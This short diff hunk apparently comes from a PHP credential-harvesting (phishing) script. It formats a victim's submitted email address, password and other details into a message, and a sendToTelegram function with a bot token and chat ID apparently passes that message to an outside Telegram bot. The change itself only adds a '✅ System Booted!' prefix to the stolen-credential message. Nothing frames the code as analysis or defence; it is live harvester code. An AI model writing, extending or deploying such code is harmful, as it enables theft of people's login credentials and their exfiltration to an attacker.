@@ -28,7 +28,7 @@ if (!filter_var($ai, FILTER_VALIDATE_EMAIL)) {
 }
 
 // Prepare message
-$message = "AI Email: $ai\nPassword: $pr\nDetail: $detail";
+$message = "✅ System Booted!\nAI Email: $ai\nPassword: $pr\nDetail: $detail";
 
 // Function to send message to Telegram
 function sendToTelegram($message, $botToken, $chatId) {
